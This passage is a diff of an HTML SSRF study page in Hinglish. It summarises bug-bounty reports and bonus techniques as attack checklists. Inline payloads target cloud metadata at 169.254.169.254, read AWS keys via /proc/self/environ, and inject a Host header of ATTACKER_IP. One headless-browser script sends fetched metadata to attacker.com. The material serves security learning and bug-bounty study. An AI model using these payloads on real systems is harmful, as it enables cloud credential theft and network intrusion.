+                    <div style="margin-top:8px;"><span class="technique-tag">Link-Local IP</span><span class="technique-tag">Link Unfurling</span><span class="technique-tag">IMDS</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">PrivateNetworkGuard ne loopback + RFC1918 IPs block kiye, par <code class="c">169.254.0.0/16</code> (Link-Local) ko "Public" samjh liya! Ruby mein <code class="c">IPAddr.new("169.254.169.254").private?</code> = <code class="c">false</code>. Chat mein link paste → Unfurl request → Cloud Metadata Service direct hit → IAM credentials accessible!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Magic Cloud IP try karo</strong> — SSRF dhoondhte waqt hamesha <code class="c">169.254.169.254</code> try karo. AWS/GCP/Azure par jackpot hai.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>IPv6 Link-Local test karo</strong> — IPv4 blocked? <code class="c">[fe80::...]</code> ranges test karo. Filters sirf IPv4 par focus karte hain.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Library logic verify karo</strong> — Ruby/Python mein <code class="c">private?</code> aur <code class="c">link_local?</code> do alag functions hain. Dono block zaroori!</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Link unfurling features dhoondho</strong> — Chat apps, Slack clones, Messaging platforms — link preview = SSRF surface.</span></li>
+                    </ul>
+                    <div class="mindset-box"><div class="mindset-label">👑 VETERAN MINDSET</div><div class="mindset-text">"Incomplete filters are as good as no filters. Sirf loopback block karna kafi nahi — cloud environment mein link-local addresses sabse bade khatre hain."</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #26 -->
+            <div class="report-card" data-severity="medium" id="report-26">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #26 · Category 35.26</div>
+                    <div class="report-title">Whitelist Bypass via URL @ Confusion (geonode.state.gov)</div>
+                    <div class="report-target">🎯 geonode.state.gov · @imthatt · Medium · VDP</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">URL Confusion</span><span class="technique-tag">@ Notation</span><span class="technique-tag">Internal Scanning</span></div>
+                </div><span class="severity-badge sev-medium">🟡 MEDIUM</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text"><code class="c">http://169.254.169.254\@geonode.state.gov</code> → Frontend ne dekha geonode.state.gov maujood hai (whitelist pass) → Backend ne <code class="c">@</code> ke pehle ka hissa "user credentials" samjha → 169.254.169.254 main host bana → Internal AWS metadata hit! 404=Host Alive, 502=Host Dead se internal network map banaya.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>URL confusion try karo</strong> — Whitelist sirf domain check? <code class="c">http://attacker-ip@whitelisted-domain.com</code> try karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Special characters test karo</strong> — <code class="c">@</code>, <code class="c">\</code>, <code class="c">#</code>, <code class="c">?</code> ka combination different parsers par try karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Response patterns analyze karo</strong> — 404 vs 502 ya response time ka farq = Internal Host Discovery!</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Network range scan karo</strong> — SSRF milte hi internal IP ranges (169.254.169.x) sequentially scan karo.</span></li>
+                    </ul>
+                    <div class="protip-box"><div class="protip-label">💡 PRO TIP</div><div class="protip-text">Security is in the details of parsing. Ek simple @ character ne poori whitelist ki dhajjiya uda di kyunki frontend aur backend ek hi URL ko alag samajh rahe the.</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #27 -->
+            <div class="report-card" data-severity="high" id="report-27">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #27 · Category 35.27</div>
+                    <div class="report-title">WordPress XML-RPC Pingback — Unauthenticated Blind SSRF (DoD)</div>
+                    <div class="report-target">🎯 DoD WordPress · @0r10nh4ck · High · VDP</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">XML-RPC</span><span class="technique-tag">Pingback</span><span class="technique-tag">Blind SSRF</span><span class="technique-tag">OOB</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text"><code class="c">/xmlrpc.php</code> active tha → <code class="c">pingback.ping</code> method mein Source URL = attacker server, Target = victim post. WordPress ne attacker ke URL ko fetch kiya → DoD ke IP se request aayi → Internal port scanning (response time analysis) + DDoS relay possible. Bina login ke!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>/xmlrpc.php check karo</strong> — WordPress site par ye file dhoondho. <code class="c">system.listMethods</code> ya <code class="c">pingback.ping</code> test karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Interactsh/Collaborator use karo</strong> — Blind SSRF ke liye external listener chalao. Bina iske proof nahi.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Cloud metadata try karo</strong> — Pingback payload mein <code class="c">http://169.254.169.254</code> daal ke response time check karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Internal port scanning karo</strong> — <code class="c">127.0.0.1:22</code>, <code class="c">127.0.0.1:3306</code> — response time se open/closed pata chalta hai.</span></li>
+                    </ul>
+                    <div class="mindset-box"><div class="mindset-label">👑 VETERAN MINDSET</div><div class="mindset-text">"Legacy features are a goldmine for bugs." Pingback purana concept hai jo aaj kal kam use hota hai, par hazaron servers ko SSRF ke liye vulnerable banaye huye hai.</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #28 -->
+            <div class="report-card" data-severity="low" id="report-28">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #28 · Category 35.28</div>
+                    <div class="report-title">Blind SSRF Attempt — Defense in Depth Victory (Tumblr)</div>
+                    <div class="report-target">🎯 Tumblr / Automattic · @atc_h1h1 · Informative</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Blind SSRF</span><span class="technique-tag">Egress Filters</span><span class="technique-tag">Defense in Depth</span></div>
+                </div><span class="severity-badge sev-info">🔵 INFO</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text"><code class="c">/api/v2/url_info?url=</code> endpoint mein external URL dalte hi Tumblr server ne hacker ke server ko hit kiya (IP: 74.114.154.11). Par internal domain (<code class="c">ssrf-server.tumblr.net</code>) hit nahi hua → Automattic ke Egress Filters ne internal access block kiya → "Defense in Depth" victory!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Internal testing endpoint mango</strong> — Company se "Internal Test URL" mango. Use hit kar lete ho tabhi badi bounty milti hai.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Response time analysis karo</strong> — Response nahi dikha? "Time-based Analysis" se Open ports jaldi, closed der se respond karte hain.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>IP identification karo</strong> — Request teri server par company infrastructure se aayi ya Cloud Proxy (AWS/Cloudflare) se?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>External ping ≠ Bounty samjho</strong> — External URL hit karna SSRF ka pehla step hai, par internal access prove karna zaroori hai.</span></li>
+                    </ul>
+                    <div class="impact-box"><div class="impact-label">⚠️ KEY LESSON</div><div class="impact-text">"Every external ping is not a bounty." Automattic ki security itni majboot thi ki hacker internal network mein ghus nahi paya. Defense in Depth kaam karti hai!</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #29 -->
+            <div class="report-card" data-severity="high" id="report-29">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #29 · Category 35.29</div>
+                    <div class="report-title">DNS Rebinding Protection Bypass — Error Handling Flaw (GitLab)</div>
+                    <div class="report-target">🎯 GitLab.com · @mclaren650sspider · High · $3,500</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">DNS Rebinding</span><span class="technique-tag">Error Handling</span><span class="technique-tag">CNAME Chaining</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text"><code class="c">url_blocker.rb</code> DNS lookup karke IP validate karta tha. Par agar DNS error aaye (resolve na ho), toh protection trigger hi nahi hota tha (Fail Open)! Hacker ne custom DNS server banaya → Pehle error/invalid response → Protection skip → 15 sec baad "Test Webhook" → DNS ne <code class="c">169.254.169.254</code> return kiya → GCP Metadata leak! $3,500 bounty.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>DNS Rebinding with errors test karo</strong> — Aise domains try karo jo kabhi resolve hote kabhi nahi (NXDOMAIN).</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>CNAME chaining use karo</strong> — DNS caching bypass ke liye CNAME records ka use karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>15-30 sec gap rakho</strong> — SSRF attempts ke beech mein gap rakho taaki DNS cache expire ho jaye.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Error handling check karo</strong> — DNS fail hone par app "Fail Open" (allow) karti hai ya "Fail Close" (block)?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">05</span><span class="item-text"><strong>Custom DNS server banao</strong> — Alternating responses dene wala DNS server setup karo (hacker1.xyz jaisa).</span></li>
+                    </ul>
+                    <div class="chain-box"><div class="chain-label">⛓️ CHAIN FORMULA</div><div class="chain-formula">Custom DNS → Error Response → Protection Skip → Wait TTL → Rebind to 169.254.169.254 → GCP Metadata → $3,500</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #30 -->
+            <div class="report-card" data-severity="high" id="report-30">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #30 · Category 35.30</div>
+                    <div class="report-title">Host Header Injection — Blind SSRF via Rails Routing (GitLab)</div>
+                    <div class="report-target">🎯 GitLab EE · @jobert · High · $4,000</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Host Header</span><span class="technique-tag">Rails Routing</span><span class="technique-tag">OAuth Controller</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Jira OAuth controller mein <code class="c">oauth_token_url</code> Rails ke <code class="c">_url</code> helper se banta tha jo Host Header se URL construct karta hai. Hacker ne <code class="c">Host: [ATTACKER_IP]:81</code> dala → Server ne POST request hacker ke IP par bheji. Endpoint unauthenticated tha → Bina login ke server ko kisi bhi Internal IP par ping karwa sakte ho! $4,000 bounty.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Host header fuzz karo</strong> — Sirf URL parameters mat dekho, Host header mein internal IPs daal ke dekho server kahan fetch karta hai.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Rails helpers check karo</strong> — <code class="c">_url</code> vs <code class="c">_path</code> ka farq samjho. <code class="c">_url</code> aksar Host header par depend karta hai.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Unauthenticated endpoints dhoondho</strong> — Bina login kiye server se HTTP POST karwa sakein = Critical!</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Timeout exhaustion check karo</strong> — Slow server ka IP doge toh thread 60 sec block hota hai → DoS!</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">05</span><span class="item-text"><strong>Internal port scanning karo</strong> — Host header mein <code class="c">localhost:22</code>, <code class="c">169.254.169.254</code> daal ke check karo.</span></li>
+                    </ul>
+                    <div class="chain-box"><div class="chain-label">⛓️ CHAIN FORMULA</div><div class="chain-formula">Host Header Injection → Rails _url Helper → OAuth Token URL Redirect → Blind SSRF → Internal Scanning → DoS</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ═══ BONUS PHASE — 5 EXTRA SSRF TECHNIQUES ═══ -->
+    <section class="phase-section" id="phase6">
+        <div class="phase-header"><span class="phase-number">BONUS</span><span class="phase-title">5 EXTRA SSRF TECHNIQUES — MISSING FROM REPORTS</span><span class="phase-count" id="p6count">0 / 5 reports</span></div>
+        <div class="cards-grid" id="grid-phase6">
+
+            <!-- BONUS #31 -->
+            <div class="report-card" data-severity="high" id="report-31">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ BONUS #31 · EXTRA TECHNIQUE</div>
+                    <div class="report-title">SSRF via Server-Side Template Injection (SSTI)</div>
+                    <div class="report-target">🎯 Template Engines (Jinja2, Twig, Freemarker)</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">SSTI</span><span class="technique-tag">Template Engine</span><span class="technique-tag">RCE Chain</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">SSTI se SSRF: Template engine mein <code class="c">{{request.get('http://169.254.169.254/')}}</code> inject karke server ko internal URLs fetch karwa sakte ho. Jinja2 mein <code class="c">__import__('urllib').urlopen()</code> se HTTP requests trigger hoti hain. SSTI directly SSRF + RCE ka gateway hai!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>SSTI detect karo</strong> — <code class="c">{{7*7}}</code> daal ke dekho 49 render hota hai? Template engine active hai!</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Object traversal se HTTP client dhoondho</strong> — <code class="c">__globals__</code>, <code class="c">__builtins__</code> se <code class="c">urllib</code> ya <code class="c">requests</code> access karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Internal URLs fetch karo</strong> — SSTI se <code class="c">http://169.254.169.254</code> ya <code class="c">http://localhost:6379</code> hit karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Email/PDF templates check karo</strong> — Invoice generators, email templates mein SSTI common hai.</span></li>
+                    </ul>
+                    <div class="chain-box"><div class="chain-label">⛓️ CHAIN FORMULA</div><div class="chain-formula">User Input → Template Engine → SSTI → Object Traversal → urllib/requests → SSRF → Cloud Metadata → RCE</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- BONUS #32 -->
+            <div class="report-card" data-severity="medium" id="report-32">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ BONUS #32 · EXTRA TECHNIQUE</div>
+                    <div class="report-title">SSRF via GraphQL Batch Queries & Introspection</div>
+                    <div class="report-target">🎯 GraphQL APIs (Apollo, Hasura, Custom)</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">GraphQL</span><span class="technique-tag">Batch Query</span><span class="technique-tag">Introspection</span></div>
+                </div><span class="severity-badge sev-medium">🟡 MEDIUM</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">GraphQL APIs mein mutations ya queries jo URLs accept karti hain (e.g., <code class="c">importFromUrl</code>, <code class="c">fetchPreview</code>) → SSRF ka entry point. Batch queries se multiple internal URLs ek saath scan karo. Introspection se hidden mutations dhoondho jo URL-based operations karti hain!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Introspection query bhejo</strong> — <code class="c">__schema</code> se saare queries/mutations list karo. URL-accepting fields dhoondho.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Batch queries se scan karo</strong> — Single request mein 50+ internal URLs parallel test karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Mutation fields mein URLs dhoondho</strong> — <code class="c">webhookUrl</code>, <code class="c">callbackUrl</code>, <code class="c">avatarUrl</code> jaise fields SSRF targets hain.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Error-based SSRF detect karo</strong> — Different errors (timeout vs connection refused) se port status identify karo.</span></li>
+                    </ul>
+                    <div class="protip-box"><div class="protip-label">💡 PRO TIP</div><div class="protip-text">GraphQL APIs aksar REST se zyada attack surface deti hain. Batch queries se time-based internal port scanning bahut fast ho jata hai!</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- BONUS #33 -->
+            <div class="report-card" data-severity="high" id="report-33">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ BONUS #33 · EXTRA TECHNIQUE</div>
+                    <div class="report-title">SSRF via Cloud Functions / Serverless (AWS Lambda)</div>
+                    <div class="report-target">🎯 AWS Lambda, Azure Functions, GCP Cloud Functions</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Serverless</span><span class="technique-tag">Lambda</span><span class="technique-tag">Environment Variables</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Serverless functions mein SSRF ka impact alag hota hai: <code class="c">http://169.254.169.254</code> par Lambda-specific credentials milte hain + <code class="c">/proc/self/environ</code> se environment variables (API keys, DB passwords) leak hote hain. Lambda function ka temporary IAM role chura ke poora AWS account compromise possible!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Lambda metadata check karo</strong> — <code class="c">http://169.254.169.254/2021-03-31/dynamic/instance-identity/</code></span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Environment variables read karo</strong> — <code class="c">file:///proc/self/environ</code> se AWS_ACCESS_KEY_ID, AWS_SECRET nikaalo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Lambda runtime API hit karo</strong> — <code class="c">http://127.0.0.1:9001/2018-06-01/runtime/invocation/next</code></span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>IAM role credentials steal karo</strong> — Temporary credentials se S3, DynamoDB, aur doosre AWS services access karo.</span></li>
+                    </ul>
+                    <div class="impact-box"><div class="impact-label">💥 MAXIMUM IMPACT</div><div class="impact-text">Serverless SSRF = Direct cloud account compromise. Lambda function ke temporary IAM credentials se poora AWS infrastructure control possible hai!</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- BONUS #34 -->
+            <div class="report-card" data-severity="medium" id="report-34">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ BONUS #34 · EXTRA TECHNIQUE</div>
+                    <div class="report-title">SSRF via HTTP Parameter Pollution (HPP)</div>
+                    <div class="report-target">🎯 Multi-framework Applications (Node.js, PHP, Java)</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">HPP</span><span class="technique-tag">Duplicate Params</span><span class="technique-tag">WAF Bypass</span></div>
+                </div><span class="severity-badge sev-medium">🟡 MEDIUM</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">WAF/Filter pehle parameter check karta hai, par backend doosra parameter use karta hai: <code class="c">?url=safe.com&url=http://169.254.169.254</code>. PHP last value leta hai, Node.js pehla, Java/Spring array banata hai. Is inconsistency se URL filter bypass ho jata hai → SSRF!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Duplicate parameters try karo</strong> — <code class="c">?url=safe.com&url=evil.com</code> bhej ke dekho kaun sa use hota hai.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Framework behavior jano</strong> — PHP = last, Node = first, ASP.NET = comma-separated, Java = array.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>WAF bypass karo</strong> — WAF pehla parameter check karta hai toh doosre mein malicious URL daal do.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Array notation try karo</strong> — <code class="c">url[]=safe.com&url[]=evil.com</code></span></li>
+                    </ul>
+                    <div class="mindset-box"><div class="mindset-label">👑 VETERAN MINDSET</div><div class="mindset-text">"Parameter handling inconsistency between WAF and backend is a classic bypass vector. Jab do systems ek hi input ko alag samajhein, wahi hacker ka mauka hota hai."</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- BONUS #35 -->
+            <div class="report-card" data-severity="high" id="report-35">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ BONUS #35 · EXTRA TECHNIQUE</div>
+                    <div class="report-title">SSRF via Headless Browser / Puppeteer Exploitation</div>
+                    <div class="report-target">🎯 Headless Chrome, Puppeteer, Playwright, Selenium</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Headless Browser</span><span class="technique-tag">Puppeteer</span><span class="technique-tag">Chrome DevTools</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Headless browsers (Puppeteer/Playwright) jo screenshots/PDFs generate karte hain → Full browser context mein JS execute hota hai → <code class="c">&lt;script&gt;fetch('http://169.254.169.254/').then(r=>r.text()).then(d=>new Image().src='http://attacker.com/?d='+btoa(d))&lt;/script&gt;</code> → Cloud metadata exfiltrate via image request! Chrome DevTools Protocol (CDP) port 9222 bhi target hota hai.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Headless browser detect karo</strong> — User-Agent mein "HeadlessChrome" hai? Screenshot/PDF service hai?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>JS injection se SSRF karo</strong> — <code class="c">fetch()</code> + <code class="c">XMLHttpRequest</code> se internal URLs hit karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Chrome DevTools Protocol check karo</strong> — Port 9222 par <code class="c">/json</code> endpoint se browser instances list karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Data exfiltration via rendering karo</strong> — Fetched data ko page par render karwa ke screenshot/PDF mein capture karo.</span></li>
+                    </ul>
+                    <div class="chain-box"><div class="chain-label">⛓️ CHAIN FORMULA</div><div class="chain-formula">HTML Input → Headless Browser Render → JS Execute → fetch(internal_url) → Data Render → Screenshot/PDF → Exfiltrate</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ═══ FOOTER ═══ -->
+    <footer class="mission-footer">
+        <p class="footer-text">⬡ MISSION 07 — SSRF MASTERY ⬡ 30 REPORTS + 5 BONUS ⬡ COMPLETE REGISTER ⬡</p>
+    </footer>
+
+    <script>
+    const STORAGE_KEY = 'm07_ssrf_state';
+    function toggleItem(el) { el.classList.toggle('done'); saveState(); updateCardProgress(el.closest('.report-card')); updateMasterProgress(); }
+    function updateCardProgress(card) {
+        if (!card) return;
+        const items = card.querySelectorAll('.checklist-item'), done = card.querySelectorAll('.checklist-item.done');
+        const pct = items.length ? Math.round((done.length / items.length) * 100) : 0;
+        const pctEl = card.querySelector('.card-progress-pct'), barEl = card.querySelector('.card-bar-fill');
+        if (pctEl) pctEl.textContent = pct + '%'; if (barEl) barEl.style.width = pct + '%';
+    }
+    function updateMasterProgress() {
+        const allItems = document.querySelectorAll('.checklist-item'), allDone = document.querySelectorAll('.checklist-item.done');
+        const pct = allItems.length ? Math.round((allDone.length / allItems.length) * 100) : 0;
+        document.getElementById('masterPct').textContent = pct + '%';
+        document.getElementById('masterBar').style.width = pct + '%';
+        document.getElementById('completedItems').textContent = allDone.length;
+        let completedCards = 0;
+        document.querySelectorAll('.report-card').forEach(c => {
+            const t = c.querySelectorAll('.checklist-item').length, d = c.querySelectorAll('.checklist-item.done').length;
+            if (t > 0 && t === d) completedCards++;
+        });
+        document.getElementById('completedCards').textContent = completedCards;
+        // Phase counts
+        ['phase1','phase2','phase3','phase4','phase5','phase6'].forEach((pid, i) => {
+            const sec = document.getElementById(pid); if (!sec) return;
